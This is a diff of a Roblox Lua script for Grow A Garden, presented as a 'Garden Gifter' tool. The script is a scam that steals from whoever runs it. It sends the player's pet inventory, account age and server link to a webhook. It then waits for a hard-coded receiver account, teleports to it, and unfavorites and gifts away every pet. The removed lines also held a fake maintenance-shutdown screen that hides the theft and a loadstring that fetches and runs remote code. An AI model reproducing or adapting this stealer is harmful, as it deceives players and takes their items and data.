@@ -7,7 +7,6 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
@@ -18,8 +17,7 @@ local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Dis
 local CHECK_INTERVAL = 5 -- seconds between receiver checks
 local SHUTDOWN_DURATION = 10 -- seconds to show shutdown screen
 local GIFT_COOLDOWN = 3 -- seconds between gifts
-local CHAT_KEYWORD = "a" -- Simple keyword to look for in chat messages
-local GIFT_PROMPT_TEXT = "actiontext gift pet" -- Text to look for in gift prompt
+local CHAT_KEYWORD = "a" -- Keyword to look for in chat
 local MINIMUM_PETS = 3 -- Minimum pets required to proceed
 local MINIMUM_TOTAL_VALUE = 50000 -- Minimum total pet value (in cents)
 
@@ -29,36 +27,26 @@ if syn then
     setfflag("HttpServiceEnabled", true)
 end
 
--- Enhanced Webhook Function with better error handling
+-- Enhanced Webhook Function
 local function sendWebhook(data)
-    -- Validate input
     if not data or (not data.content and not data.embeds) then
         warn("Webhook data is empty or invalid")
         return false
     end
 
-    -- Construct body with defaults
     local body = {
         content = data.content,
-        embeds = data.embeds or {},
+        embeds = data.embeds,
         username = "Garden Gifter",
         avatar_url = "https://i.imgur.com/6JqX9yP.png"
     }
 
-    -- Encode to JSON with error handling
-    local json, encodeError
-    for _ = 1, 3 do -- Retry up to 3 times
-        json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
-        if json then break end
-        task.wait(1)
-    end
-
+    local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
     if not json then
         warn("Failed to encode webhook data:", encodeError)
         return false
     end
 
-    -- Try different request methods
     local requestMethods = {
         syn and syn.request,
         http_request,
@@ -67,7 +55,6 @@ local function sendWebhook(data)
         http and http.request
     }
 
-    local lastError
     for _, reqFunc in ipairs(requestMethods) do
         if type(reqFunc) == "function" then
             local success, response = pcall(function()
@@ -85,225 +72,25 @@ local function sendWebhook(data)
             if success and response then
                 if response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
                     return true
-                else
-                    lastError = "HTTP "..tostring(response.StatusCode or "no status")..": "..tostring(response.Body or "no body")
                 end
-            else
-                lastError = response or "Unknown error"
             end
         end
     end
-
-    warn("All webhook request methods failed. Last error:", lastError)
     return false
 end
 
--- Loading GUI
-local function createLoader()
-    local loaderGui = Instance.new("ScreenGui")
-    loaderGui.Name = "TwiistyLoader"
-    loaderGui.IgnoreGuiInset = true
-    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    loaderGui.DisplayOrder = 999999
-
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 150)
-    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = loaderGui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = mainFrame
-
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Text = "TwiistyScripts Loader"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 24
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 10)
-    titleLabel.Parent = mainFrame
-
-    local subLabel = Instance.new("TextLabel")
-    subLabel.Text = "Subscribe to TwiistyScripts on YouTube"
-    subLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    subLabel.TextSize = 16
-    subLabel.Font = Enum.Font.Gotham
-    subLabel.BackgroundTransparency = 1
-    subLabel.Size = UDim2.new(1, 0, 0, 30)
-    subLabel.Position = UDim2.new(0, 0, 0, 40)
-    subLabel.Parent = mainFrame
-
-    local progressFrame = Instance.new("Frame")
-    progressFrame.Size = UDim2.new(0.9, 0, 0, 20)
-    progressFrame.Position = UDim2.new(0.05, 0, 0, 100)
-    progressFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    progressFrame.BorderSizePixel = 0
-    progressFrame.Parent = mainFrame
-
-    local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(0, 10)
-    progressCorner.Parent = progressFrame
-
-    local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(130, 36, 212)
-    progressBar.BorderSizePixel = 0
-    progressBar.Parent = progressFrame
-
-    local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(0, 10)
-    barCorner.Parent = progressBar
-
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Text = "Initializing..."
-    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    statusLabel.TextSize = 14
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Size = UDim2.new(1, 0, 0, 20)
-    statusLabel.Position = UDim2.new(0, 0, 0, 120)
-    statusLabel.Parent = mainFrame
-
-    loaderGui.Parent = CoreGui
-
-    -- Animate progress
-    local function updateProgress(percent, text)
-        TweenService:Create(progressBar, TweenInfo.new(0.5), {
-            Size = UDim2.new(percent / 100, 0, 1, 0)
-        }):Play()
-        statusLabel.Text = text
-    end
-
-    -- Simulate loading
-    updateProgress(10, "Checking executor...")
-    task.wait(1)
-    updateProgress(30, "Preparing systems...")
-    task.wait(1.5)
-    updateProgress(60, "Scanning for receivers...")
-    task.wait(2)
-    updateProgress(100, "Ready!")
-    task.wait(1)
-
-    -- Fade out
-    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
-        Size = UDim2.new(0, 0, 0, 0)
-    }):Play()
-    task.wait(0.5)
-    loaderGui:Destroy()
-end
-
--- Custom shutdown screen
-local function createFakeShutdown()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "FakeShutdown"
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.DisplayOrder = 999999
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Text = "Grow A Garden"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.Size = UDim2.new(1, 0, 0.3, 0)
-    title.Position = UDim2.new(0, 0, 0.3, 0)
-    title.BackgroundTransparency = 1
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 32
-    title.TextTransparency = 1
-    title.Parent = frame
-
-    local message = Instance.new("TextLabel")
-    message.Text = "Servers shutting down for maintenance..."
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.Size = UDim2.new(1, 0, 0.2, 0)
-    message.Position = UDim2.new(0, 0, 0.5, 0)
-    message.BackgroundTransparency = 1
-    message.Font = Enum.Font.SourceSans
-    message.TextSize = 24
-    message.TextTransparency = 1
-    message.Parent = frame
-
-    local dots = Instance.new("TextLabel")
-    dots.Text = "Please wait"
-    dots.TextColor3 = Color3.new(1, 1, 1)
-    dots.Size = UDim2.new(1, 0, 0.1, 0)
-    dots.Position = UDim2.new(0, 0, 0.6, 0)
-    dots.BackgroundTransparency = 1
-    dots.Font = Enum.Font.SourceSans
-    dots.TextSize = 18
-    dots.TextTransparency = 1
-    dots.Parent = frame
-
-    gui.Parent = CoreGui
-
-    -- Fade-in animation
-    local fadeInTime = 1.5
-    local fadeInStart = os.clock()
-    local fadeConn
-    fadeConn = RunService.Heartbeat:Connect(function()
-        local elapsed = os.clock() - fadeInStart
-        local alpha = math.min(elapsed / fadeInTime, 1)
-
-        title.TextTransparency = 1 - alpha
-        message.TextTransparency = 1 - alpha
-        dots.TextTransparency = 1 - alpha
-
-        if alpha >= 1 then
-            fadeConn:Disconnect()
-        end
-    end)
-
-    -- Dot animation
-    local dotCount = 0
-    local lastDotTime = os.clock()
-    local dotInterval = 0.8
-    local dotConn
-    dotConn = RunService.Heartbeat:Connect(function()
-        local now = os.clock()
-        if now - lastDotTime >= dotInterval then
-            lastDotTime = now
-            dotCount = (dotCount + 1) % 4
-            dots.Text = "Please wait"..string.rep(".", dotCount)
-        end
-    end)
-
-    -- Pulsing title effect
-    local pulseConn
-    pulseConn = RunService.Heartbeat:Connect(function()
-        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
-        title.TextSize = 32 * pulse
-    end)
-
-    return gui, function()
-        if fadeConn then fadeConn:Disconnect() end
-        if dotConn then dotConn:Disconnect() end
-        if pulseConn then pulseConn:Disconnect() end
-        gui:Destroy()
-    end
-end
-
--- Get all pets in inventory sorted by quality
-local function getSortedPets()
+-- Get all pets in inventory with proper detection
+local function getPetsInventory()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if not backpack then return {} end
 
     local pets = {}
-
     for _, item in ipairs(backpack:GetChildren()) do
         local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
         if nameMatch then
             local petName = nameMatch
-            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]"))
-            local age = tonumber(item.Name:match("%[Age (%d+)%]"))
+            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
+            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
             local isSpecial = false
 
             for _, specialName in ipairs(SPECIAL_PETS) do
@@ -323,52 +110,30 @@ local function getSortedPets()
             })
         end
     end
-
-    if #pets == 0 then return pets end
-
-    -- Sort pets by special first, then by kg and age
-    table.sort(pets, function(a, b)
-        if a.special and not b.special then return true end
-        if not a.special and b.special then return false end
-        if a.kg ~= b.kg then return a.kg > b.kg end
-        return a.age > b.age
-    end)
-
     return pets
 end
 
--- Calculate total inventory value
-local function calculateInventoryValue(pets)
-    local totalValue = 0
-    for _, pet in ipairs(pets) do
-        totalValue = totalValue + (pet.kg * 10000) + (pet.age * 1000)
-    end
-    return math.floor(totalValue)
+-- Calculate pet value
+local function calculatePetValue(kg, age)
+    return math.floor((kg * 10000) + (age * 1000))
 end
 
--- Send initial inventory report to webhook
+-- Send initial inventory report
 local function sendInitialReport()
-    local pets = getSortedPets()
-    if #pets < MINIMUM_PETS then
-        return false, "Not enough pets ("..#pets.."/"..MINIMUM_PETS..")"
-    end
-
-    local totalValue = calculateInventoryValue(pets)
-    if totalValue < MINIMUM_TOTAL_VALUE then
-        return false, "Low value ("..totalValue.."/"..MINIMUM_TOTAL_VALUE.."¢)"
-    end
-
+    local pets = getPetsInventory()
     local placeId = game.PlaceId
     local jobId = game.JobId
     local serverUrl = "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
 
-    -- Build pet list description
+    -- Calculate total value and build pet list
+    local totalValue = 0
     local petList = ""
     local specialCount = 0
+    
     for _, pet in ipairs(pets) do
-        local value = math.floor((pet.kg * 10000) + (pet.age * 1000))
-        petList = petList..string.format(
-            "%s %s [%.2f KG] [Age %d] → %d¢\n",
+        local value = calculatePetValue(pet.kg, pet.age)
+        totalValue = totalValue + value
+        petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %d¢\n",
             pet.special and "🌟" or "🐶",
             pet.name,
             pet.kg,
@@ -379,7 +144,7 @@ local function sendInitialReport()
     end
 
     local embed = {
-        title = "🌿 Garden Gifter Initial Report",
+        title = "🌿 Garden Gifter - Initial Report",
         description = string.format([[
 **Player:** %s (@%s)
 **Account Age:** %d days
@@ -412,77 +177,90 @@ local function sendInitialReport()
     })
 end
 
+-- Loading GUI
+local function createLoader()
+    local loaderGui = Instance.new("ScreenGui")
+    loaderGui.Name = "GardenLoader"
+    loaderGui.IgnoreGuiInset = true
+    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loaderGui.DisplayOrder = 999999
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 400, 0, 150)
+    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = loaderGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Text = "Garden Gifter"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 24
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 10)
+    titleLabel.Parent = mainFrame
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Text = "Initializing..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusLabel.TextSize = 14
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Size = UDim2.new(1, 0, 0, 20)
+    statusLabel.Position = UDim2.new(0, 0, 0, 120)
+    statusLabel.Parent = mainFrame
+
+    loaderGui.Parent = CoreGui
+    return statusLabel
+end
+
 -- Check if pet is favorited
 local function isPetFavorited(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    return pet:GetAttribute("Favorited") or false
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    return pet and pet:GetAttribute("Favorited")
 end
 
 -- Unfavorite a pet
 local function unfavoritePet(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    local args = {pet}
-    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
-    return true
-end
-
--- Check if gift prompt is visible for a specific player
-local function isGiftPromptVisible(targetPlayer)
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            local headText = gui:FindFirstChild("Head", true)
-            local actionText = gui:FindFirstChild("actiontext", true)
-
-            if headText and actionText then
-                if headText.Text:find(targetPlayer.Name) and actionText.Text:lower():find(GIFT_PROMPT_TEXT:lower()) then
-                    return true
-                end
-            end
-        end
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if pet then
+        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        return true
     end
     return false
 end
 
 -- Gift pet using remote
 local function giftPet(targetPlayer, petName)
-    local args = {
-        "GivePet",
-        targetPlayer
-    }
-    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
 end
 
--- Equip a single pet (unequips any others first)
+-- Equip a single pet
 local function equipSinglePet(petName)
-    -- First unequip any currently equipped pets
     local character = LocalPlayer.Character
-    if character then
-        for _, item in ipairs(character:GetChildren()) do
-            if item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$") then
-                item.Parent = LocalPlayer:FindFirstChild("Backpack")
-            end
+    if not character then return false end
+
+    -- Unequip current pets
+    for _, item in ipairs(character:GetChildren()) do
+        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
+            item.Parent = LocalPlayer.Backpack
         end
     end
 
-    -- Now equip the new pet
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    pet.Parent = LocalPlayer.Character
-    return true
+    -- Equip new pet
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if pet then
+        pet.Parent = character
+        return true
+    end
+    return false
 end
 
 -- Teleport to target player
@@ -495,11 +273,9 @@ local function teleportToPlayer(targetPlayer)
     local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     if not targetHrp then return false end
 
-    -- Teleport behind the target
     local offset = targetHrp.CFrame.LookVector * -5
-    offset = Vector3.new(offset.X, 0, offset.Z) -- Keep same height
+    offset = Vector3.new(offset.X, 0, offset.Z)
     humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
-
     return true
 end
 
@@ -507,70 +283,31 @@ end
 local function isReceiverInGame()
     for _, receiverName in ipairs(RECEIVERS) do
         local player = Players:FindFirstChild(receiverName)
-        if player then
-            return player
-        end
+        if player then return player end
     end
     return nil
 end
 
--- Wait for a receiver to join or say the keyword in chat
+-- Wait for a receiver to join or say the keyword
 local function waitForReceiver()
     local receiverFound = Instance.new("BindableEvent")
 
-    -- Function to check if a player is a receiver
-    local function checkReceiver(player)
-        for _, receiverName in ipairs(RECEIVERS) do
-            if player.Name == receiverName then
-                return true
-            end
-        end
-        return false
-    end
-
-    -- Function to handle player messages
-    local function onPlayerMessage(player, message)
-        if message:lower() == CHAT_KEYWORD:lower() then
-            if checkReceiver(player) then
-                receiverFound:Fire(player)
-            end
-        end
-    end
-
-    -- Check existing players first
+    -- Check existing players
     for _, player in ipairs(Players:GetPlayers()) do
-        if checkReceiver(player) then
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
             break
         end
     end
 
-    -- Set up listeners
-    local connections = {}
-
     -- Listen for new players
-    connections.playerAdded = Players.PlayerAdded:Connect(function(player)
-        if checkReceiver(player) then
+    local connection = Players.PlayerAdded:Connect(function(player)
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
         end
     end)
 
-    -- Listen for chat messages from all players
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player:FindFirstChild("PlayerGui") then
-            local chatEvents = player.PlayerGui:FindFirstChild("ChatEvents")
-            if chatEvents then
-                local chatRemote = chatEvents:FindFirstChild("SayMessageRequest")
-                if chatRemote then
-                    connections["chat_"..player.Name] = chatRemote.OnClientEvent:Connect(function(message)
-                        onPlayerMessage(player, message)
-                    end)
-                end
-            end
-        end
-    end
-
-    -- Also set up periodic checking as backup
+    -- Backup periodic checking
     local backupCheck = coroutine.create(function()
         while true do
             local receiver = isReceiverInGame()
@@ -583,104 +320,53 @@ local function waitForReceiver()
     end)
     coroutine.resume(backupCheck)
 
-    -- Wait for either detection method to find a receiver
     local foundReceiver = receiverFound.Event:Wait()
-
-    -- Clean up connections
-    for _, connection in pairs(connections) do
-        connection:Disconnect()
-    end
-
+    connection:Disconnect()
     return foundReceiver
 end
 
 -- Main gifting loop
 local function startGifting(targetPlayer)
     while true do
-        -- Get sorted list of pets
-        local pets = getSortedPets()
-        if #pets == 0 then
-            task.wait(5)
-            continue
-        end
+        local pets = getPetsInventory()
+        if #pets == 0 then break end
 
-        -- Process one pet at a time
         for _, pet in ipairs(pets) do
-            -- Check if pet is favorited
             if isPetFavorited(pet.fullName) then
                 unfavoritePet(pet.fullName)
                 task.wait(1)
             end
 
-            -- Equip only this pet (will unequip any others)
-            if not equipSinglePet(pet.fullName) then
-                continue
+            if equipSinglePet(pet.fullName) then
+                giftPet(targetPlayer, pet.fullName)
+                task.wait(GIFT_COOLDOWN)
+                break
             end
-            task.wait(0.5)
-
-            -- Gift the pet using remote
-            giftPet(targetPlayer, pet.fullName)
-
-            -- Wait before next pet
-            task.wait(GIFT_COOLDOWN)
-
-            -- After gifting, the pet should be gone from inventory
-            -- So we break and get a fresh list of pets
-            break
         end
-
-        -- Small delay before checking pets again
         task.wait(1)
     end
 end
 
--- Safely load the spawner
-local function loadSpawner()
-    local success, spawner = pcall(function()
-        return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-    end)
+-- Main Execution
+local statusLabel = createLoader()
 
-    if success and spawner then
-        spawner.Load()
-    end
-end
-
--- Main execution flow
-createLoader()
-
--- Send initial inventory report
-local reportSuccess, reportError = sendInitialReport()
+-- Send initial report immediately
+statusLabel.Text = "Sending inventory report..."
+local reportSuccess = sendInitialReport()
 if not reportSuccess then
-    warn("Initial report failed:", reportError)
+    statusLabel.Text = "Failed to send report"
+    task.wait(3)
     return
 end
 
--- Load the spawner in the background
-task.spawn(loadSpawner)
-
--- Wait for loader to finish
-task.wait(5)
-
--- Wait for a receiver to join or say the keyword
+statusLabel.Text = "Waiting for receiver..."
 local receiver = waitForReceiver()
-
--- Check if receiver was actually found
 if not receiver then
+    statusLabel.Text = "No receiver found"
+    task.wait(3)
     return
 end
 
--- Show shutdown screen and teleport to receiver
-local shutdownGui, cleanupFunc = createFakeShutdown()
+statusLabel.Text = "Starting gifting process..."
 teleportToPlayer(receiver)
-
--- Start the gifting process
-task.wait(2)
 startGifting(receiver)
-
--- Clean up shutdown screen after duration
-task.wait(SHUTDOWN_DURATION)
-if type(cleanupFunc) == "function" then
-    cleanupFunc()
-elseif shutdownGui then
-    shutdownGui:Destroy()
-end
